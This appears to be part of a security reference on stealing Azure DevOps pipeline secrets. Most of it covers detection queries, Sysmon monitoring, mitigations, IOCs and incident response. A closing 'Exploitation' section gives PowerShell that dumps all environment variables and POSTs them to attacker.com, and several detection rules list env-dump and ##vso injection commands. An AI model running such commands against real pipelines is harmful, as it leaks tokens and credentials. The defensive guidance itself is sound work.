| summarize count() by InitiatedBy, OperationName, bin(TimeGenerated, 5m)
| where count_ > 3  # Multiple envvar reads suspicious
| project TimeGenerated, InitiatedBy, OperationName, count_
```

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Environment Variable Enumeration in Pipeline`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `15 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents from alerts triggered by this analytics rule**
7. Click **Review + create** → **Create**

**What This Detects:**
- Anomalous environment variable enumeration
- Attempts to access System.AccessToken outside normal CI/CD flow
- Pattern of dumping env vars followed by exfiltration

**False Positive Analysis:**
- **Legitimate Activity:** Diagnostic jobs that enumerate environment variables for troubleshooting
- **Benign Tools:** Azure DevOps self-diagnostic tasks
- **Tuning:** Exclude known diagnostic pipelines with `| where InitiatedBy != "DiagnosticAgent"`

---

### Query 2: Detect CVE-2023-21553 Exploitation (Logging Command Injection)

**Rule Configuration:**
- **Required Table:** AuditLogs, PipelineJobLogs (if available)
- **Alert Severity:** Critical
- **Frequency:** Real-time or every 5 minutes

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "PipelineJobCompleted"
    or ActivityDetails contains "##vso[task.setvariable"
    or ActivityDetails contains "##vso[task.setsecret"
| where ActivityDetails matches regex @"##vso\[task\.(setvar|setsecret).*\(SYSTEM_ACCESSTOKEN|DB_|API_|SECRET_\)"
| project TimeGenerated, InitiatedBy, OperationName, ActivityDetails
| where TimeGenerated > ago(24h)
```

**What This Detects:**
- Injection of ##vso commands in commit messages or pull requests
- Attempts to extract secrets via logging commands
- Real-time detection of CVE-2023-21553 exploitation

---

## 8. Windows Event Log Monitoring

**Event ID: 4688 (Process Creation) - if logs forwarded**
- **Log Source:** Microsoft-Windows-Sysmon/Operational (if Sysmon enabled on agent)
- **Trigger:** Pipeline agent spawns PowerShell/Bash with environment variable dump commands
- **Filter:** `CommandLine contains "Get-ChildItem Env:" OR CommandLine contains "env" OR CommandLine contains "##vso"`
- **Applies To Versions:** Windows agents (Server 2016-2025)

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Monitor for Process Creation with Suspicious Arguments:**
```
PowerShell.exe with arguments containing: Get-ChildItem Env:, ConvertTo-Base64, $env:SYSTEM_ACCESSTOKEN
cmd.exe with arguments: env > file.txt, printenv | grep TOKEN
```

---

## 9. Defensive Mitigations

### Priority 1: CRITICAL

* **Restrict System.AccessToken Exposure:** By default, `System.AccessToken` is NOT automatically available. Require explicit enablement.
  
  **Applies To Versions:** All Azure DevOps versions
  
  **Manual Steps (Pipeline YAML - Recommended):**
  ```yaml
  steps:
  - task: PowerShell@2
    inputs:
      targetType: 'inline'
      script: |
        Write-Host "Token is only available via explicit mapping"
    env:
      # DO NOT include SYSTEM_ACCESSTOKEN unless absolutely necessary
      # If needed:
      # SYSTEM_ACCESSTOKEN: $(System.AccessToken)
  ```
  
  **Manual Steps (Classic Pipeline UI):**
  1. Go to **Pipeline** → **Variables**
  2. DO NOT check "Make secrets available to whole job"
  3. If token is needed, map it only in specific task:
     - Select task → **Control Options**
     - Environment variables: `SYSTEM_ACCESSTOKEN=$(System.AccessToken)`
  
  **Manual Steps (Disable Token for Service Connections):**
  1. Go to **Project Settings** → **Service Connections**
  2. Select connection → **Edit**
  3. Uncheck "Grant access permission to all pipelines"
  4. Add specific pipeline access only (principle of least privilege)

* **Implement Secret Masking in Logs:** Ensure all secrets are properly marked as secrets, not as regular variables.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Pipeline** → **Edit**
  2. Go to **Variables**
  3. For each secret variable, check the **lock icon** to mark as secret
  4. Save pipeline
  
  **Manual Steps (YAML):**
  ```yaml
  variables:
  - name: MyPassword
    value: 'PlainPassword123'  # This WILL appear in logs
  - name: MySecret
    value: 'SecretValue456'
    secret: true  # This will NOT appear in logs
  ```
  
  **Validation Command (Verify Masking):**
  ```powershell
  # After pipeline runs, check build logs
  # Secret variables should show as "***" in UI and portal logs
  ```

* **Enable Audit Logging for Variable Access:**
  
  **Manual Steps (Azure DevOps Services):**
  1. Go to **Organization Settings** → **Audit Log Settings**
  2. Enable: **Pipeline activities** (PipelineModified, PipelineJobCompleted, etc.)
  3. Set **Retention policy:** At least 90 days
  
  **Manual Steps (Azure DevOps Server 2022+):**
  1. Admin console → **Settings** → **Audit**
  2. Enable audit log collection
  3. Review logs regularly for suspicious variable access

* **Restrict Pipeline Edit Permissions:**
  
  **Manual Steps (Project-level):**
  1. Go to **Project Settings** → **Permissions**
  2. Select **Contributors** group
  3. For "Edit Build Pipelines": Set to **Deny**
  4. Add specific users/groups who need this permission
  5. Implement code review requirement for pipeline changes

---

### Priority 2: HIGH

* **Use Variable Groups with Azure Key Vault Integration:** Instead of storing secrets in pipeline, fetch from Key Vault at runtime with minimal exposure window.
  
  **Manual Steps:**
  1. Go to **Pipelines** → **Library** → **+ Variable group**
  2. Check **Link secrets from an Azure key vault**
  3. Select **Azure subscription** and **Key Vault**
  4. Select **Secrets** to include
  5. Click **Link**
  
  **Validation:**
  ```yaml
  variables:
  - group: KeyVaultSecrets  # Linked group
  
  steps:
  - task: PowerShell@2
    inputs:
      script: |
        # Secret available, but masked in logs
        Write-Host "Using database password: $(DatabasePassword)"
  ```

* **Implement Conditional Access for Pipeline Execution:**
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block CI/CD from Non-Corporate IP`
  4. **Assignments:**
     - Users: Pipeline service principals
     - Cloud apps: **Azure DevOps**
  5. **Conditions:**
     - Locations: **Exclude corporate IP ranges**
  6. **Access controls:**
     - Grant: **Block access**
  7. Enable policy: **On**
  8. Click **Create**

* **Use Managed Identities for Azure Resource Access (Instead of Secrets):**
  
  **Manual Steps:**
  1. Create **User-Assigned Managed Identity** in Azure
  2. In pipeline, authenticate without storing credentials:
     ```yaml
     steps:
     - task: AzureKeyVault@1
       inputs:
         ConnectedServiceName: 'ManagedIdentity'  # Not PAT
         KeyVaultName: 'mykeyvault'
         SecretsFilter: '*'
     ```

---

### Priority 3: MEDIUM

* **Enable Sysmon on Self-Hosted Agents (for advanced logging):**
  
  **Manual Steps (Windows Agent):**
  1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
  2. Create config file:
     ```xml
     <Sysmon schemaversion="4.30">
       <EventFiltering>
         <ProcessCreate onmatch="include">
           <CommandLine condition="contains any">Get-ChildItem Env:,env,printenv,$env:,##vso</CommandLine>
         </ProcessCreate>
       </EventFiltering>
     </Sysmon>
     ```
  3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
  4. Forward logs to Sentinel

---

### Access Control & Policy Hardening

* **RBAC for Pipeline Service Principals:** Limit Azure RBAC role to least privilege (avoid Contributor).
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Subscriptions** → **Access Control (IAM)**
  2. Select **Custom role** (create specific permissions)
  3. Assign **only required permissions**:
     - `Microsoft.Resources/subscriptions/resourceGroups/read`
     - `Microsoft.Compute/virtualMachines/*/read`
     - (NOT `Microsoft.Authorization/roleAssignments/write`)

* **Require Pipeline Branch Protection:** Block direct commits; require PRs with review.
  
  **Manual Steps:**
  1. Go to **Repos** → **Branches**
  2. Select **main** branch
  3. Click **...** → **Branch policies**
  4. Enable: **Require reviewers**
  5. Enable: **Check for linked work items**
  6. Set **Minimum number of reviewers: 2**

* **Audit Variable Group Access:** Monitor who reads variables.
  
  **Manual Steps:**
  1. **Pipelines** → **Library** → **Variable groups**
  2. Select group → **Security**
  3. Remove unnecessary users/groups
  4. Log all variable group reads via audit policy

---

### Validation Command (Verify Mitigations)

**PowerShell - Check if System.AccessToken is restricted:**

```powershell
# Run this INSIDE a pipeline job
if (-not (Test-Path Env:SYSTEM_ACCESSTOKEN)) {
    Write-Host "✓ GOOD: System.AccessToken is NOT exposed by default"
} else {
    Write-Host "✗ BAD: System.AccessToken is exposed! Restrict it immediately."
}

# Check for suspicious variables
$suspiciousVars = Get-ChildItem Env: | Where-Object { 
    $_.Name -match "PASSWORD|TOKEN|KEY|SECRET|CREDENTIAL|API" 
}

if ($suspiciousVars.Count -eq 0) {
    Write-Host "✓ GOOD: No high-risk variables found in environment"
} else {
    Write-Host "✗ WARNING: Found $($suspiciousVars.Count) potentially sensitive variables"
    $suspiciousVars | Format-Table
}
```

**Expected Output (If Secure):**
```
✓ GOOD: System.AccessToken is NOT exposed by default
✓ GOOD: No high-risk variables found in environment
```

---

## 10. Detection & Incident Response

### Indicators of Compromise (IOCs)

* **Files:** 
  - `env_dump.txt`, `env_dump_b64.txt` (temporary files with environment dump)
  - `credentials.json`, `token.txt` in build artifact staging directory
  - `~/.ssh/config` modified with new SSH keys
  
* **Registry (Windows agents):**
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` with suspicious entries
  
* **Network:**
  - Outbound HTTP/HTTPS to non-whitelist domains during pipeline execution
  - DNS queries for unusual domains (attacker C2)
  - LDAP queries from pipeline agent to domain controllers (lateral movement)

* **Behavior:**
  - Process execution of `env`, `printenv`, `Get-ChildItem Env:` in pipeline jobs
  - Encoding/compression commands (`base64`, `gzip`, `zip`)
  - File write to temp directories followed by curl/wget exfiltration
  - API calls to `/variablegroups/` endpoints

---

### Forensic Artifacts

* **Disk (Pipeline Agent):**
  - Build cache: `C:\agent_work\` (Windows) or `/home/vsts/work/` (Linux)
  - Temporary files: `C:\agent_work\_temp\` or `/tmp/`
  - Pipeline logs: forwarded to Azure DevOps audit logs (cloud)

* **Memory:**
  - Process `powershell.exe` or `bash` contains environment variable values
  - Dump with `procdump.exe` or `gcore` for analysis

* **Cloud (Azure DevOps / Sentinel):**
  - **AuditLogs table:** PipelineJobCompleted, PipelineModified events
  - **CustomLogs:** If pipeline logs are forwarded to Sentinel
  - **Build logs UI:** Access via Azure DevOps Portal → Pipeline → Build details

* **Networking:**
  - **Azure Network Watcher:** Captured packets from agent to attacker domain
  - **Firewall logs:** Egress attempts to non-whitelisted IPs/domains

---

### Response Procedures

1. **Isolate:**
   
   **Command (Disable Pipeline Immediately):**
   ```powershell
   # Via REST API (requires admin PAT)
   $pat = "your_pat_here"
   $orgUrl = "https://dev.azure.com/contoso"
   $project = "MyProject"
   $pipelineId = 12345
   
   $url = "$orgUrl/$project/_apis/pipelines/$pipelineId?api-version=7.0-preview.1"
   $body = @{enabled=$false} | ConvertTo-Json
   Invoke-RestMethod -Uri $url -Authentication Bearer -Token (ConvertTo-SecureString $pat -AsPlainText -Force) -Method Patch -Body $body -ContentType "application/json"
   ```
   
   **Manual (Azure Portal):**
   1. Go to **Pipelines** → Select compromised pipeline
   2. Click **...** → **Settings**
   3. Disable pipeline immediately
   4. Pause all runs: **Pause pipeline**

2. **Revoke Compromised Credentials:**
   
   **Command (Revoke PATs):**
   ```powershell
   # List all PATs and revoke suspicious ones
   az devops security token list --org https://dev.azure.com/contoso
   az devops security token revoke --token-id "suspicious_token_id"
   ```
   
   **Manual (Azure Portal):**
   1. **Organization Settings** → **Personal access tokens**
   2. Find tokens created by compromised user
   3. Click **Revoke**
   
   **Command (Rotate Azure Service Principal):**
   ```powershell
   # Revoke service connection certificate/secret
   Remove-AzADAppCredential -ApplicationId "service_principal_id" -All
   ```

3. **Collect Evidence:**
   
   **Command (Export Pipeline Logs):**
   ```powershell
   $pat = "your_pat_here"
   $orgUrl = "https://dev.azure.com/contoso"
   $project = "MyProject"
   $pipelineId = 12345
   $buildId = 999
   
   # Get build logs
   $url = "$orgUrl/$project/_apis/build/builds/$buildId/logs?api-version=7.0"
   $logs = Invoke-RestMethod -Uri $url -Headers @{Authorization="Basic $(ConvertTo-Base64 ":$pat)"} -Method Get
   $logs.value | ForEach-Object { 
       Invoke-WebRequest -Uri $_.url -OutFile "log_$($_.id).txt"
   }
   ```
   
   **Manual (Azure Portal):**
   1. Go to **Pipeline** → **Build details**
   2. Scroll to **Logs** section
   3. Download each log file via **Download** button
   4. Save to secure storage for forensic analysis

4. **Remediate:**
   
   **Command (Delete Malicious Pipeline Branch):**
   ```bash
   git branch -D malicious-branch
   git push origin --delete malicious-branch
   ```
   
   **Manual (Repository UI):**
   1. Go to **Repos** → **Branches**
   2. Find malicious branch
   3. Click **...** → **Delete branch**

---

## 11. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1199 - Trusted Relationship](https://attack.mitre.org/techniques/T1199/) | Compromised developer account or PR merge |
| **2** | **Persistence** | [T1133 - External Remote Services](https://attack.mitre.org/techniques/T1133/) | Maintain access to DevOps portal via backdoor service connection |
| **3** | **Privilege Escalation** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) | Add malicious service principal to project admin group |
| **4** | **Credential Access** | **[CA-UNSC-015] Pipeline Environment Variables Theft** | Extract System.AccessToken and secrets from running job |
| **5** | **Lateral Movement** | [T1550.001 - Use Alternate Authentication Material: Application Access Token](https://attack.mitre.org/techniques/T1550/001/) | Use stolen token to access Azure subscription |
| **6** | **Exfiltration** | [T1041 - Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/) | Send credentials to attacker-controlled server |
| **7** | **Impact** | [T1561.002 - Disk Wipe: Unsupported File Systems](https://attack.mitre.org/techniques/T1561/002/) or Supply Chain Attack | Poison build artifacts or lock/delete resources |

---

## 12. Real-World Examples

### Example 1: GitLab npm Supply Chain Attack (2025)

- **Target:** npm open-source ecosystem (36,000+ developers)
- **Timeline:** January-February 2025
- **Technique Status:** ACTIVE
- **APT Attribution:** Lazarus Group (North Korea)
- **Attack Details:**
  - Malicious npm packages embedded code that, when installed, ran in developer CI/CD pipelines
  - Code enumerated and exfiltrated GitHub tokens, npm tokens, AWS credentials
  - Payloads were dormant initially, then activated to establish persistent C2
  - Developers unknowingly pulled poisoned packages that executed during `npm install`
- **Impact:** Potential compromise of 36,000+ development environments; supply chain attack affecting downstream users
- **Reference:** [GitLab: npm supply chain attack](https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/), [Unit 42: Shai-Hulud Worm](https://unit42.paloaltonetworks.com/npm-supply-chain-attack/)

---

### Example 2: SolarWinds CI/CD Pipeline Poisoning (2020)

- **Target:** SolarWinds Orion platform (18,000+ customers including US government)
- **Timeline:** Q3-Q4 2020
- **Technique Status:** HISTORICAL (patched) but pattern still relevant
- **Attacker:** APT29 (Russian Foreign Intelligence Service)
- **Attack Details:**
  - Attacker compromised SolarWinds CI/CD pipeline
  - Injected malicious code into legitimate SolarWinds build
  - Code was digitally signed, bypassing trust mechanisms
  - Backdoor installed in 18,000+ customer environments via automatic updates
- **Impact:** Major supply chain breach affecting US Treasury, Homeland Security, major corporations
- **Key Lesson:** Compromise of CI/CD pipeline = compromise of all downstream consumers
- **Reference:** [Palo Alto Networks: CI/CD Pipeline Attack Anatomy](https://www.paloaltonetworks.com/cyberpedia/anatomy-ci-cd-pipeline-attack)

---

### Example 3: CircleCI Secrets Exposure (2023)

- **Target:** CircleCI (CI/CD platform used by thousands of companies)
- **Timeline:** January 2023
- **Technique Status:** ACTIVE (similar vulnerability in other platforms)
- **Attack Vector:** Compromised API key exposed secrets from 890+ customer pipelines
- **Impact:**
  - GitHub tokens leaked (enabled code repo access)
  - AWS credentials exposed
  - Database connection strings and API keys compromised
  - Downstream applications vulnerable to compromise
- **Reference:** [Supply Chain Attack Mitigation](https://www.morphisec.com/blog/supply-chain-attack-mitigation/)

---

## 13. ATTACK VARIATIONS & VERSION-SPECIFIC NOTES

### Azure DevOps Server 2016-2019

**Differences:**
- Audit logging less mature; variable group secrets may not be masked
- No Conditional Access policies available
- Self-hosted agents more common; isolation weaker

**Exploitation:**
```powershell
# Server 2016-2019: Variables not masked in local logs
Get-ChildItem Env: | Out-File -FilePath "C:\Logs\env.txt"  # Plaintext credentials in file
```

---

### Azure DevOps Server 2022+

**Differences:**
- Enhanced audit logging for variable access
- Secret masking more robust (but still bypassable)
- Support for Managed Identities (reduces secret exposure)

**Exploitation:**
```powershell
# Server 2022+: Direct env dump still works; masking applies to UI only
$json = @{env=(Get-ChildItem Env: | ConvertTo-Json)} | ConvertTo-Json
Invoke-WebRequest -Uri "http://attacker.com/" -Method POST -Body $json  # Real values sent
```

---

### Azure DevOps Services (Cloud)

**Differences:**
- Real-time audit logging
- Sentinel integration available
- IP-based Conditional Access
- PAT rotation recommended

**Best Detection:** Cloud-based logging in Sentinel (see Section 7)

---